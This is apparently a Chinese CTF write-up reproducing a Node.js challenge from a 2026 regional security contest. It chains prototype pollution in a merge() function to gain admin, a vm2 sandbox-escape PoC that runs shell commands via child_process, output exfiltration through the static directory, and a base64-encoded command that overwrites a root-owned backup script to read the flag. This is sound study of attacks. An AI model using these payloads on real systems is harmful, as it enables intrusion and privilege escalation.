#  26软件安全区域赛nodejs复现  
原创 浪漫土狗
                    浪漫土狗  正在思考ing   2026-05-08 01:09  
  
# 前言  
  
所以比赛的一整天弹shell都弹不动是何意位啊😭😭😭  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rnpMSQZyiaFKwI3UBS9T9UKAE7Evta40SJa6OKmKk58pVfibEBBZG2WH80qKaSssicUe6ib7TjWNEEBc4h3kVUULxROicPAFJ0FhOg4/640?wx_fmt=png&from=appmsg "")  
特地存了vm2最新cve的poc，结果在现场尝试了一天的反弹shell都失败，而且我一弹shell环境就崩溃。当时电脑里也没有安装vm2，本地根本起不了，只能反复的开关容器尝试🤡。但是这还不是最绝望的，最绝望的是比赛时还想过写文件操作，但是不确定有没有设置静态目录，于是随便猜了个目录名没成功就放弃了，水橙想呢，反耳就在源码第七行写了静态目录的目录名🤬😡👿愣是一天都没注意到这一行的代码，也是被自己菜哭了好吧😭😭😭  
  
赛后在本地测试是能弹shell的，我真的没招了，给了兄弟。之前测试反弹shell的记录没保存，附件也删了，本文就记录下写文件处理无回显的方法。其实本来还想顺便学习一下CVE-2026-22709的漏洞原理，但显然我是高估了自己的能力了，这里就简单记录下这道题的解题思路。  
# 参考链接  
  
https://xz.aliyun.com/news/91998  
# 题目复现  
  
题目源码：  
```
const express = require('express');const path = require('path');const session = require('express-session');const { VM } = require('vm2'); const app = express();app.use('/static', express.static(path.join(__dirname, 'public')));app.use(express.json());// Session 配置app.use(session({    secret: 'random',    resave: false,    saveUninitialized: false,    cookie: {         maxAge: 3600000,  // 1小时        httpOnly: true    }}));const users = {};function merge(target, source) {    for (let key in source) {        if (key === '__proto__') continue;          if (typeof source[key] === 'object' && source[key] !== null) {            if (!target[key]) target[key] = {};            merge(target[key], source[key]);        } else {            target[key] = source[key];        }    }    return target;}// 首页app.get('/', (req, res) => {    res.sendFile(path.join(__dirname, 'public', 'index.html'));});// 注册app.post('/register', (req, res) => {    const { username, password } = req.body;        if (!username || !password) {        return res.json({ error: '用户名和密码不能为空' });    }        if (users[username]) {        return res.json({ error: '用户已存在' });    }        users[username] = { username, password };    res.json({ message: '注册成功，请登录' });});// 登录app.post('/login', (req, res) => {    const { username, password } = req.body;    const user = users[username];        if (!user || user.password !== password) {        return res.json({ error: '用户名或密码错误' });    }        req.session.user = { username: user.username };    res.json({         message: '登录成功',         user: {             username: user.username,            isAdmin: user.isAdmin        }     });});// 退出登录app.post('/logout', (req, res) => {    req.session.destroy((err) => {        if (err) {            return res.json({ error: '退出失败' });        }        res.json({ message: '已退出登录' });    });});// 修改密码app.post('/changepassword', (req, res) => {    if (!req.session.user) return res.json({ error: '请先登录' });        const username = req.session.user.username;    const user = users[username];        const { oldPassword, newPassword, confirmPassword } = req.body;        // 验证旧密码    if (user.password !== oldPassword) {        return res.json({ error: '旧密码错误' });    }        // 验证新密码    if (newPassword !== confirmPassword) {        return res.json({ error: '两次密码不一致' });    }        merge(user, req.body);    user.password = newPassword;        res.json({ message: '密码修改成功' });});// 用户信息（检查登录状态）app.get('/me', (req, res) => {    if (!req.session.user) return res.json({ error: '请先登录' });        const username = req.session.user.username;    const user = users[username];        res.json({         username: user.username,        isAdmin: user.isAdmin    });});// 管理员面板app.get('/admin', (req, res) => {    if (!req.session.user) return res.json({ error: '请先登录' });        const username = req.session.user.username;    const user = users[username];        if (user.isAdmin === true) {        res.json({             message: '欢迎管理员！',        });    } else {        res.json({ error: '需要管理员权限' });    }});app.post('/sandbox', async (req, res) => {    if (!req.session.user) return res.json({ error: '请先登录' });        const username = req.session.user.username;    const user = users[username];        if (user.isAdmin !== true) {        return res.json({ error: '需要管理员权限' });    }        const { code } = req.body;    if (!code) return res.json({ error: '请提供代码' });        try {        const sandboxResult = { value: null };                const vm = new VM({            timeout: 5000,            sandbox: { __result: sandboxResult }        });                const result = vm.run(code);                awaitnewPromise(resolve => setTimeout(resolve, 500));                res.json({             result: result?.toString() || '执行成功',            output: sandboxResult.value        });    } catch (error) {        res.json({ error: error.message });    }});app.listen(3000, () => {    console.log('Server running on port 3000');});
```  
  
注意看changepassword路由中出现merge函数，这是原型链污染最常利用的函数,我们可以通过控制req.body的内容来进行污染  
```
if (newPassword !== confirmPassword) {        return res.json({ error: '两次密码不一致' });    }        merge(user, req.body);    user.password = newPassword;        res.json({ message: '密码修改成功' });
```  
  
再看admin路由，会从users对象中获取当前用户的isAdmin值进行身份认证，isAdmin属性值为true能获取到admin权限。因为修改密码的操作是没有任何限制的，我们可以抓包然后添加一条isAdmin=true从而污染users对象中的属性。  
```
app.get('/admin', (req, res) => {    if (!req.session.user) return res.json({ error: '请先登录' });        const username = req.session.user.username;    const user = users[username];        if (user.isAdmin === true) {        res.json({             message: '欢迎管理员！',        });    } else {        res.json({ error: '需要管理员权限' });    }});
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rkXicnIiaNSJqibo0rZtyweydBeudjsg7vfzicM5DcsraPoB4icRWjenYqdO16wDgz1dg8jb050Q8owxXSR5kJBn79ERn8TMhHqLHk4/640?wx_fmt=png&from=appmsg "")  
  
再次登录就能执行命令  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rlSiaeUUclRT5qsR4SK958XGQm0icicXsGUAfUvN6XZFN1ETmGlvykWBibia8ezS2FUofc7Jw9gNiaopGb60Yhmd2UfCKkrzegaaGY9Q/640?wx_fmt=png&from=appmsg "")  
  
源码中提到vm2的版本为3.10.0，是最新的版本，所以前面老的漏洞就不再考虑，直接看最新的漏洞CVE-2026-22709。因为不懂原理这里就直接利用poc了  
```
const customInspectSymbol = Symbol.for('nodejs.util.inspect.custom');obj = {    [customInspectSymbol]: (depth, opt, inspect) => {        inspect.constructor('return process')().mainModule.require('child_process').execSync('whoami');    },    valueOf: undefined,    constructor: undefined,}WebAssembly.compileStreaming(obj).catch(()=>{});
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rliccl5yTNxX8ITlAD0tojslr4lDHUXLvKSP0cMA9uQias2uXqepwoicnkSmcvsTyTmlaleicV8EcMZxNtia9fuLibPlbrQIvO7iaz36Q/640?wx_fmt=png&from=appmsg "")  
  
结果表示执行成功，在比赛时回显的结果是绿色的，表示执行成功，如果报错就会回显红色的错误信息。针对无回显，要么就是反弹shell，要么就是写文件。本题采用的后面一个方法  
```
app.use('/static', express.static(path.join(__dirname, 'public')));
```  
  
注意到app.js中第七行的这段代码，说明是存在静态目录的，所以可以使用写文件的方法，具体操作就是将命令执行结果写入到/app/public/  
目录下的文件中，然后在浏览器上访问/static/文件名  
即可读取到静态目录下的对应文件  
```
ls / -l > /app/public/ls.txt
```  
  
改下命令，然后访问/static/ls.txt可以获取到命令执行的结果  
```
total 80drwxr-xr-x   1 root root 4096 May  7 12:26 app-rwxrwxrwx   1 root root  379 May  7 11:45 backup.shlrwxrwxrwx   1 root root    7 Apr 10 02:21 bin -> usr/bindrwxr-xr-x   2 root root 4096 Apr 18  2022 bootdrwxr-xr-x   5 root root  340 May  7 12:26 dev-rwxrwxrwx   1 root root  178 May  7 12:24 entrypoint.shdrwxr-xr-x   1 root root 4096 May  7 12:26 etc-r--------   1 root root   44 May  7 11:45 flagdrwxr-xr-x   2 root root 4096 Apr 18  2022 homelrwxrwxrwx   1 root root    7 Apr 10 02:21 lib -> usr/liblrwxrwxrwx   1 root root    9 Apr 10 02:21 lib32 -> usr/lib32lrwxrwxrwx   1 root root    9 Apr 10 02:21 lib64 -> usr/lib64lrwxrwxrwx   1 root root   10 Apr 10 02:21 libx32 -> usr/libx32drwxr-xr-x   2 root root 4096 Apr 10 02:21 mediadrwxr-xr-x   2 root root 4096 Apr 10 02:21 mntdrwxr-xr-x   2 root root 4096 Apr 10 02:21 optdr-xr-xr-x 309 root root    0 May  7 12:26 procdrwx------   1 root root 4096 May  7 12:26 rootdrwxr-xr-x   1 root root 4096 May  7 12:26 runlrwxrwxrwx   1 root root    8 Apr 10 02:21 sbin -> usr/sbindrwxr-xr-x   2 root root 4096 Apr 10 02:21 srvdr-xr-xr-x  13 root root    0 May  7 09:27 sysdrwxrwxrwt   1 root root 4096 May  7 12:26 tmpdrwxr-xr-x   1 root root 4096 Apr 10 02:21 usrdrwxr-xr-x   1 root root 4096 Apr 10 02:31 var
```  
  
可以看到flag是不可读的，没有权限，注意到该目录下还有个backup.sh文件，查看内容  
```
#!/bin/shBACKUP_DIR="/tmp/backups"TIMESTAMP=$(date +%Y%m%d_%H%M%S)BACKUP_FILE="$BACKUP_DIR/app_backup_$TIMESTAMP.tar.gz"mkdir -p "$BACKUP_DIR"echo "Creating backup: $BACKUP_FILE"tar -czf "$BACKUP_FILE" -C /app .chmod 644 "$BACKUP_FILE"cd "$BACKUP_DIR" && ls -t app_backup_*.tar.gz | tail -n +6 | xargs rm -f 2>/dev/null || trueecho "Backup completed: $BACKUP_FILE"
```  
  
这是一个备份工具，所有权为root，可以利用该文件进行提权，先将读取flag的命令覆盖该文件的内容，然后再执行该文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rkSxnMdPUhXoSFHK6TicXQ7ppibQruZAsYVNtVOlo16uwYYpKxUyIGnfIHOguWGiaOw82bibhmxXxh3jSlYyk0JgAkuJKZuQuyTwCU/640?wx_fmt=png&from=appmsg "")  
```
echo ZWNobyAiY2F0IC9mbGFnID4gL2FwcC9wdWJsaWMvZmxhZyIgPiAvYmFja3VwLnNo | base64 -d | sh
```  
  
这里我选择进行base64编码这样就不用考虑引号问题，然后再将该命令替换为/backup.sh  
运行该文件去执行写入的命令，最后访问/static/flag就能获取到flag  
  
![](https://mmbiz.qpic.cn/mmbiz_png/g673ce4c7rlibdHZWwqDauwuPr6xLiaRqtg65icIlMxK6CNBNhJib12mKEdyHnSEgyLIrKnMQ6GZaEnZu3ccmJVicWjZZnG8K26QqUMoEia03luog/640?wx_fmt=png&from=appmsg "")  
  
  
